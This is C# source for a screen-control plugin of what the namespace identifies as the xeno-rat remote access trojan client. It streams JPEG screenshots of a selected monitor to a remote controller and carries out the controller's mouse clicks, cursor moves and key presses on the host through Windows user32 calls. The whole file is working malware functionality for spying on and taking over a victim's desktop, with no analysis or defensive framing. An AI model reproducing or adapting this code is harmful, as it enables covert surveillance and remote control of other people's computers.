using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using xeno_rat_client;


namespace Plugin
{
    public class Main
    {
        Node ImageNode;
        bool playing = false;
        int quality = 100;
        int moniter_index = -1;
        double scale = 1;

        /// <summary>
        /// Sets the DPI awareness for the current process.
        /// </summary>
        /// <param name="awareness">The awareness level to be set.</param>
        /// <returns>Returns 0 if the function succeeds; otherwise, a non-zero value.</returns>
        [DllImport("SHCore.dll", SetLastError = true)]
        public static extern int SetProcessDpiAwareness(int awareness);

        /// <summary>
        /// Asynchronously runs the specified node and performs various actions based on the received data.
        /// </summary>
        /// <param name="node">The node to be run.</param>
        /// <exception cref="Exception">Thrown when an error occurs during the execution of the method.</exception>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method asynchronously runs the specified node and performs various actions based on the received data.
        /// It sends a byte array with value 3 to indicate that it has connected.
        /// If the sub-sub-node is not accepted, it disconnects the image node and the specified node.
        /// It sets the process DPI awareness to 2, indicating awareness of the DPI per monitor.
        /// It starts a screenshot thread to capture the screen.
        /// While the node is connected, it receives data and performs different actions based on the received data.
        /// If an error occurs during the execution of the method, it disconnects the image node.
        /// </remarks>
        public async Task Run(Node node)
        {
            await node.SendAsync(new byte[] { 3 });//indicate that it has connected
            if (!await AcceptSubSubNode(node)) 
            {
                ImageNode?.Disconnect();
                node.Disconnect();
            }

            SetProcessDpiAwareness(2);//2 is being aware of the dpi per monitor

            ScreenShotThread();
            byte[] data=null;
            try
            {
                while (node.Connected())
                {
                    data = await node.ReceiveAsync();
                    if (data == null)
                    {
                        ImageNode?.Disconnect();
                        break;
                    }
                    if (data[0] == 0)
                    {
                        playing = true;
                    }
                    else if (data[0] == 1)
                    {
                        playing = false;
                    }
                    else if (data[0] == 2)
                    {
                        string[] mons = ScreenshotTaker.AvailableMonitors();
                        string monsString = "";
                        foreach (string i in mons)
                        {
                            monsString += i.Replace("\n", "-") + "\n";
                        }
                        if (monsString != "")
                        {
                            monsString = monsString.Substring(0, monsString.Length - 1);//remove the ending newline
                        }
                        await node.SendAsync(Encoding.UTF8.GetBytes(monsString));
                    }
                    else if (data[0] == 3)
                    {
                        quality = node.sock.BytesToInt(data,1);
                    }
                    else if (data[0] == 4)
                    {
                        Screen[] screens = Screen.AllScreens;
                        moniter_index = node.sock.BytesToInt(data,1);
                        byte[] w = node.sock.IntToBytes(screens[moniter_index].Bounds.Width);
                        byte[] h = node.sock.IntToBytes(screens[moniter_index].Bounds.Height);
                        await node.SendAsync(SocketHandler.Concat(w,h));
                    }
                    else if (data[0] == 5)
                    {
                        int x = node.sock.BytesToInt(data, 1);
                        int y = node.sock.BytesToInt(data, 5);
                        Point coords = new Point((int)((x + Screen.AllScreens[moniter_index].Bounds.X) / scale), (int)((y + Screen.AllScreens[moniter_index].Bounds.Y) / scale));
                        InputHandler.SimulateMouseClick(coords);
                    }
                    else if (data[0] == 6)
                    {
                        int x = node.sock.BytesToInt(data, 1);
                        int y = node.sock.BytesToInt(data, 5);
                        Point coords = new Point((int)((x + Screen.AllScreens[moniter_index].Bounds.X) / scale), (int)((y + Screen.AllScreens[moniter_index].Bounds.Y) / scale));
                        InputHandler.SimulateMouseDoubleClick(coords);
                    }
                    else if (data[0] == 7)
                    {
                        int x = node.sock.BytesToInt(data, 1);
                        int y = node.sock.BytesToInt(data, 5);
                        Point coords = new Point((int)((x + Screen.AllScreens[moniter_index].Bounds.X) / scale), (int)((y + Screen.AllScreens[moniter_index].Bounds.Y) / scale));
                        InputHandler.SimulateMouseUp(coords);
                    }
                    else if (data[0] == 8)
                    {
                        int x = node.sock.BytesToInt(data, 1);
                        int y = node.sock.BytesToInt(data, 5);
                        Point coords = new Point((int)((x + Screen.AllScreens[moniter_index].Bounds.X) / scale), (int)((y + Screen.AllScreens[moniter_index].Bounds.Y) / scale));
                        InputHandler.SimulateMouseDown(coords);

                    }
                    else if (data[0] == 9)
                    {
                        int x = node.sock.BytesToInt(data, 1);
                        int y = node.sock.BytesToInt(data, 5);
                        Point coords = new Point((int)((x + Screen.AllScreens[moniter_index].Bounds.X) / scale), (int)((y + Screen.AllScreens[moniter_index].Bounds.Y) / scale));
                        InputHandler.SimulateMouseRightClick(coords);
                    }
                    else if (data[0] == 10)
                    {
                        int x = node.sock.BytesToInt(data, 1);
                        int y = node.sock.BytesToInt(data, 5);
                        Point coords = new Point((int)((x + Screen.AllScreens[moniter_index].Bounds.X) / scale), (int)((y + Screen.AllScreens[moniter_index].Bounds.Y) / scale));
                        InputHandler.SimulateMouseMiddleClick(coords);
                    }
                    else if (data[0] == 11)
                    {
                        int x = node.sock.BytesToInt(data,1);
                        int y = node.sock.BytesToInt(data,5);
                        Point coords = new Point((int)((x + Screen.AllScreens[moniter_index].Bounds.X) / scale), (int)((y + Screen.AllScreens[moniter_index].Bounds.Y) / scale));

                        InputHandler.SimulateMouseMove(coords);
                        
                    }
                    else if (data[0] == 12)
                    {
                        int keyCode = node.sock.BytesToInt(data,1);
                        InputHandler.SimulateKeyPress(keyCode);
                    }
                    else if (data[0] == 13) 
                    {
                        scale = (double)node.sock.BytesToInt(data,1)/10000.0;
                    }
                }
            }
            catch
            {
                ImageNode?.Disconnect();
            }
            GC.Collect();
        }

        /// <summary>
        /// Takes screenshots and sends them to the connected image node.
        /// </summary>
        /// <remarks>
        /// This method continuously takes screenshots using the ScreenshotTaker class with the specified quality, monitor index, and scale, and sends the captured data to the connected image node.
        /// If the application is not in a playing state or the monitor index is not set, it waits for 500 milliseconds before continuing.
        /// </remarks>
        /// <exception cref="Exception">Thrown when an error occurs while taking the screenshot or sending the data to the image node.</exception>
        /// <returns>A task representing the asynchronous operation.</returns>
        public async Task ScreenShotThread() 
        {
            try
            {
                while (ImageNode.Connected())
                {
                    if (!playing || moniter_index == -1)
                    {
                        await Task.Delay(500);
                        continue;
                    }
                    try
                    {

                        byte[] data = await Task.Run(() =>
                        {
                            return ScreenshotTaker.TakeScreenshot(quality, moniter_index, true, scale);
                        });
                        await ImageNode.SendAsync(data);
                    }
                    catch
                    {

                    }
                }
            }
            catch { }
        }

        /// <summary>
        /// Asynchronously accepts a subnode and adds it to the parent node.
        /// </summary>
        /// <param name="node">The subnode to be accepted and added.</param>
        /// <returns>True if the subnode is successfully accepted and added; otherwise, false.</returns>
        /// <remarks>
        /// This method asynchronously receives an ID from the input <paramref name="node"/> and checks if it exists in the parent node's subnodes.
        /// If the ID exists, it sends a confirmation and adds the subnode to the parent node. If not, it sends a rejection.
        /// </remarks>
        public async Task<bool> AcceptSubSubNode(Node node) 
        {
            byte[] id = await node.ReceiveAsync();
            if (id != null)
            {
                int nodeid = node.sock.BytesToInt(id);
                Node tempnode = null;
                foreach (Node i in node.Parent.subNodes)
                {
                    if (i.SetId == nodeid)
                    {
                        await node.SendAsync(new byte[] { 1 });
                        tempnode = i;
                        break;
                    }
                }
                if (tempnode == null)
                {
                    await node.SendAsync(new byte[] { 0 });
                    return false;
                }
                node.AddSubNode(tempnode);
                ImageNode = tempnode;
                return true;
            }
            else
            {
                return false;
            }
        }
    }
    public class InputHandler
    {

        /// <summary>
        /// Sets the cursor position to the specified coordinates.
        /// </summary>
        /// <param name="x">The x-coordinate of the new cursor position.</param>
        /// <param name="y">The y-coordinate of the new cursor position.</param>
        /// <returns>True if the cursor position was successfully set; otherwise, false.</returns>
        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool SetCursorPos(int x, int y);

        /// <summary>
        /// Simulates mouse input by moving the cursor to the specified coordinates or by generating mouse button clicks and wheel scrolls.
        /// </summary>
        /// <param name="dwFlags">The type of mouse event to be simulated, such as mouse movement, left button down, left button up, right button down, right button up, etc.</param>
        /// <param name="dx">The absolute position of the mouse along the x-axis.</param>
        /// <param name="dy">The absolute position of the mouse along the y-axis.</param>
        /// <param name="dwData">If dwFlags contains MOUSEEVENTF_WHEEL, then dwData specifies the amount of wheel movement. A positive value indicates that the wheel was rotated forward, away from the user; a negative value indicates that the wheel was rotated backward, toward the user.</param>
        /// <param name="dwExtraInfo">An additional value associated with the mouse event.</param>
        /// <remarks>
        /// This method simulates mouse input by calling the mouse_event function from the user32.dll library. It can be used to perform various mouse-related actions, such as moving the cursor to specific coordinates, clicking mouse buttons, and scrolling the mouse wheel.
        /// </remarks>
        [DllImport("user32.dll", SetLastError = true)]
        private static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, IntPtr dwExtraInfo);

        private const int KEYEVENTF_KEYDOWN = 0x0000;
        private const int KEYEVENTF_KEYUP = 0x0002;

        /// <summary>
        /// Simulates a keyboard event by generating a sequence of key-down and key-up messages for a specified virtual key.
        /// </summary>
        /// <param name="bVk">The virtual-key code of the key to be pressed.</param>
        /// <param name="bScan">The hardware scan code of the key to be pressed.</param>
        /// <param name="dwFlags">Specifies various aspects of function operation. This parameter can be a combination of the following flag values: KEYEVENTF_EXTENDEDKEY, KEYEVENTF_KEYUP, KEYEVENTF_SCANCODE, and KEYEVENTF_UNICODE.</param>
        /// <param name="dwExtraInfo">An additional value associated with the key stroke.</param>
        [DllImport("user32.dll")]
        private static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo);

        private const uint MOUSEEVENTF_MOVE = 0x0001;
        private const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
        private const uint MOUSEEVENTF_LEFTUP = 0x0004;
        private const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
        private const uint MOUSEEVENTF_RIGHTUP = 0x0010;
        private const uint MOUSEEVENTF_MIDDLEDOWN = 0x0020;
        private const uint MOUSEEVENTF_MIDDLEUP = 0x0040;
        private const uint MOUSEEVENTF_XDOWN = 0x0080;
        private const uint MOUSEEVENTF_XUP = 0x0100;
        private const uint MOUSEEVENTF_WHEEL = 0x0800;
        private const uint MOUSEEVENTF_HWHEEL = 0x1000;
        private const uint MOUSEEVENTF_ABSOLUTE = 0x8000;

        /// <summary>
        /// Simulates a mouse click at the specified screen coordinates.
        /// </summary>
        /// <param name="screenCoords">The screen coordinates where the mouse click should be simulated.</param>
        /// <remarks>
        /// This method sets the cursor position to the specified screen coordinates using the SetCursorPos function.
        /// It then simulates a left mouse button down event followed by a left mouse button up event using the mouse_event function, effectively simulating a mouse click at the specified screen coordinates.
        /// </remarks>
        public static void SimulateMouseClick(Point screenCoords)
        {
            SetCursorPos(screenCoords.X, screenCoords.Y);

            mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, IntPtr.Zero);
            mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, IntPtr.Zero);
        }

        /// <summary>
        /// Simulates a double click of the left mouse button at the specified screen coordinates.
        /// </summary>
        /// <param name="screenCoords">The screen coordinates where the double click should be simulated.</param>
        /// <remarks>
        /// This method simulates a double click of the left mouse button at the specified screen coordinates by first setting the cursor position to the given coordinates using SetCursorPos method.
        /// Then, it simulates the left mouse button down event followed by the left mouse button up event, and repeats the same sequence to simulate a double click.
        /// </remarks>
        public static void SimulateMouseDoubleClick(Point screenCoords)
        {
            SetCursorPos(screenCoords.X, screenCoords.Y);

            mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, IntPtr.Zero);
            mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, IntPtr.Zero);

            mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, IntPtr.Zero);
            mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, IntPtr.Zero);
        }

        /// <summary>
        /// Simulates a mouse button press at the specified screen coordinates.
        /// </summary>
        /// <param name="screenCoords">The screen coordinates where the mouse button press should be simulated.</param>
        /// <remarks>
        /// This method sets the cursor position to the specified screen coordinates using the SetCursorPos function.
        /// It then simulates a left mouse button press at the current cursor position using the mouse_event function with the MOUSEEVENTF_LEFTDOWN flag.
        /// </remarks>
        public static void SimulateMouseDown(Point screenCoords)
        {
            SetCursorPos(screenCoords.X, screenCoords.Y);

            mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, IntPtr.Zero);
        }

        /// <summary>
        /// Simulates a mouse up event at the specified screen coordinates.
        /// </summary>
        /// <param name="screenCoords">The screen coordinates where the mouse up event should be simulated.</param>
        /// <remarks>
        /// This method sets the cursor position to the specified screen coordinates and simulates a left mouse button release event using the mouse_event function from the Windows API.
        /// </remarks>
        public static void SimulateMouseUp(Point screenCoords)
        {
            SetCursorPos(screenCoords.X, screenCoords.Y);

            mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, IntPtr.Zero);
        }

        /// <summary>
        /// Simulates a mouse move to the specified screen coordinates.
        /// </summary>
        /// <param name="screenCoords">The screen coordinates to move the mouse to.</param>
        /// <remarks>
        /// This method simulates a mouse move to the specified screen coordinates using the SetCursorPos function from the Windows API.
        /// </remarks>
        public static void SimulateMouseMove(Point screenCoords)
        {
            SetCursorPos(screenCoords.X, screenCoords.Y);
        }

        /// <summary>
        /// Simulates a right-click of the mouse at the specified screen coordinates.
        /// </summary>
        /// <param name="screenCoords">The screen coordinates where the right-click should be simulated.</param>
        /// <remarks>
        /// This method sets the cursor position to the specified screen coordinates using the SetCursorPos function.
        /// It then simulates a right mouse button down event using the mouse_event function with the MOUSEEVENTF_RIGHTDOWN flag, followed by a right mouse button up event using the mouse_event function with the MOUSEEVENTF_RIGHTUP flag.
        /// </remarks>
        public static void SimulateMouseRightClick(Point screenCoords)
        {
            SetCursorPos(screenCoords.X, screenCoords.Y);

            mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, IntPtr.Zero);
            mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, IntPtr.Zero);
        }

        /// <summary>
        /// Simulates mouse scrolling at the specified screen coordinates by the given scroll amount.
        /// </summary>
        /// <param name="screenCoords">The screen coordinates where the scrolling should be simulated.</param>
        /// <param name="scrollAmount">The amount of scrolling to be simulated.</param>
        /// <remarks>
        /// This method simulates mouse scrolling at the specified screen coordinates by generating a mouse wheel event with the given scroll amount.
        /// The scroll amount is converted to scroll lines based on the standard WHEEL_DELTA value of 120, and the mouse wheel event is triggered using the WinAPI function mouse_event.
        /// </remarks>
        public static void SimulateMouseScroll(Point screenCoords, int scrollAmount)
        {
            const int WHEEL_DELTA = 120;
            int scrollLines = scrollAmount / WHEEL_DELTA;

            SetCursorPos(screenCoords.X, screenCoords.Y);

            mouse_event(MOUSEEVENTF_WHEEL, 0, 0, (uint)scrollLines, IntPtr.Zero);
        }

        /// <summary>
        /// Simulates a middle mouse click at the specified screen coordinates.
        /// </summary>
        /// <param name="screenCoords">The screen coordinates where the middle mouse click should be simulated.</param>
        /// <remarks>
        /// This method sets the cursor position to the specified screen coordinates using the SetCursorPos function.
        /// It then simulates a middle mouse button down event using the mouse_event function with the MOUSEEVENTF_MIDDLEDOWN flag.
        /// After that, it simulates a middle mouse button up event using the mouse_event function with the MOUSEEVENTF_MIDDLEUP flag.
        /// </remarks>
        public static void SimulateMouseMiddleClick(Point screenCoords)
        {
            SetCursorPos(screenCoords.X, screenCoords.Y);

            mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, IntPtr.Zero);
            mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, IntPtr.Zero);
        }

        /// <summary>
        /// Simulates a key press for the specified key code.
        /// </summary>
        /// <param name="keyCode">The virtual-key code of the key to be pressed.</param>
        /// <remarks>
        /// This method simulates a key press by sending a key-down event followed by a key-up event for the specified key code.
        /// </remarks>
        public static void SimulateKeyPress(int keyCode)
        {
            // Simulate keydown
            keybd_event((byte)keyCode, 0, KEYEVENTF_KEYDOWN, 0);

            // Simulate keyup
            keybd_event((byte)keyCode, 0, KEYEVENTF_KEYUP, 0);
        }
    }
    public class ScreenshotTaker
    {
        [StructLayout(LayoutKind.Sequential)]
        struct CURSORINFO
        {
            public Int32 cbSize;
            public Int32 flags;
            public IntPtr hCursor;
            public POINTAPI ptScreenPos;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct POINTAPI
        {
            public int x;
            public int y;
        }

        /// <summary>
        /// Retrieves information about the global cursor.
        /// </summary>
        /// <param name="pci">A reference to a CURSORINFO structure that receives the cursor information.</param>
        /// <returns><see langword="true"/> if successful; otherwise, <see langword="false"/>.</returns>
        [DllImport("user32.dll")]
        static extern bool GetCursorInfo(out CURSORINFO pci);

        /// <summary>
        /// Draws an icon at the specified coordinates on the device context.
        /// </summary>
        /// <param name="hDC">A handle to the device context where the icon will be drawn.</param>
        /// <param name="X">The x-coordinate of the upper-left corner of the icon.</param>
        /// <param name="Y">The y-coordinate of the upper-left corner of the icon.</param>
        /// <param name="hIcon">A handle to the icon to be drawn.</param>
        /// <returns>True if the icon is successfully drawn; otherwise, false.</returns>
        [DllImport("user32.dll")]
        static extern bool DrawIcon(IntPtr hDC, int X, int Y, IntPtr hIcon);

        const Int32 CURSOR_SHOWING = 0x00000001;

        /// <summary>
        /// Takes a screenshot of the specified screen and returns the image data as a byte array.
        /// </summary>
        /// <param name="quality">The quality of the image (0-100).</param>
        /// <param name="screenIndex">The index of the screen to capture.</param>
        /// <param name="captureCursor">A boolean value indicating whether to capture the cursor in the screenshot.</param>
        /// <param name="scaleImageSize">The scale factor for resizing the captured image (default is 1).</param>
        /// <returns>The image data as a byte array representing the screenshot of the specified screen.</returns>
        /// <remarks>
        /// This method captures the screenshot of the specified screen using the specified quality and captures the cursor if specified.
        /// It then encodes the image data as a byte array and returns it.
        /// If the specified screen index is invalid, it returns null and logs an error message to the console.
        /// </remarks>
        /// <exception cref="System.ArgumentOutOfRangeException">Thrown when the screen index is out of range.</exception>
        public static byte[] TakeScreenshot(int quality, int screenIndex, bool captureCursor, double scaleImageSize = 1)
        {
            Screen[] screens = Screen.AllScreens;

            if (screenIndex < 0 || screenIndex >= screens.Length)
            {
                Console.WriteLine("Invalid screen index.");
                return null;
            }

            Screen selectedScreen = screens[screenIndex];

            int screenLeft = (int)(selectedScreen.Bounds.Left);
            int screenTop = (int)(selectedScreen.Bounds.Top);
            int screenWidth = (int)(selectedScreen.Bounds.Width);
            int screenHeight = (int)(selectedScreen.Bounds.Height);
            Bitmap bitmap = new Bitmap(screenWidth, screenHeight, PixelFormat.Format24bppRgb);
            using (Graphics graphics = Graphics.FromImage(bitmap))
            {
                graphics.CopyFromScreen(screenLeft, screenTop, 0, 0, bitmap.Size, CopyPixelOperation.SourceCopy);

                if (captureCursor)
                {
                    CURSORINFO pci;
                    pci.cbSize = Marshal.SizeOf(typeof(CURSORINFO));

                    if (GetCursorInfo(out pci))
                    {
                        if (pci.flags == CURSOR_SHOWING)
                        {
                            DrawIcon(graphics.GetHdc(), pci.ptScreenPos.x - screenLeft, pci.ptScreenPos.y - screenTop, pci.hCursor);
                            graphics.ReleaseHdc();
                        }
                    }
                }

                EncoderParameters encoderParams = new EncoderParameters(1);
                encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);

                ImageCodecInfo codecInfo = GetEncoderInfo(ImageFormat.Jpeg);
                if (scaleImageSize != 1) 
                {
                    Bitmap resized = new Bitmap(bitmap, new Size((int)(bitmap.Width*scaleImageSize), (int)(bitmap.Height * scaleImageSize)));
                    bitmap.Dispose();
                    bitmap = resized;
                }
                using (MemoryStream stream = new MemoryStream())
                {
                    bitmap.Save(stream, codecInfo, encoderParams);
                    bitmap.Dispose();
                    return stream.ToArray();
                }
            }
        }

        /// <summary>
        /// Retrieves the encoder information for the specified image format.
        /// </summary>
        /// <param name="format">The image format for which to retrieve the encoder information.</param>
        /// <returns>The <see cref="ImageCodecInfo"/> object that represents the encoder for the specified image format, or null if no matching encoder is found.</returns>
        /// <remarks>
        /// This method retrieves the available image encoders using <see cref="ImageCodecInfo.GetImageEncoders"/> and iterates through the list to find the encoder that matches the specified image format's GUID.
        /// If a matching encoder is found, it is returned; otherwise, null is returned.
        /// </remarks>
        private static ImageCodecInfo GetEncoderInfo(ImageFormat format)
        {
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageEncoders();

            foreach (ImageCodecInfo codec in codecs)
            {
                if (codec.FormatID == format.Guid)
                {
                    return codec;
                }
            }

            return null;
        }

        /// <summary>
        /// Retrieves the names of all available monitors.
        /// </summary>
        /// <returns>An array of strings containing the names of all available monitors.</returns>
        /// <remarks>
        /// This method retrieves the names of all available monitors by querying the system for the list of screens using the Screen.AllScreens property.
        /// It then creates an array of strings to store the names of the monitors and populates it by iterating through the list of screens and retrieving the DeviceName property of each screen.
        /// The method returns the array of monitor names.
        /// </remarks>
        public static string[] AvailableMonitors()
        {
            Screen[] screens = Screen.AllScreens;
            string[] monitors = new string[screens.Length];
            for (int i = 0; i < screens.Length; i++)
            {
                monitors[i] = screens[i].DeviceName;
            }
            return monitors;
        }
    }
}
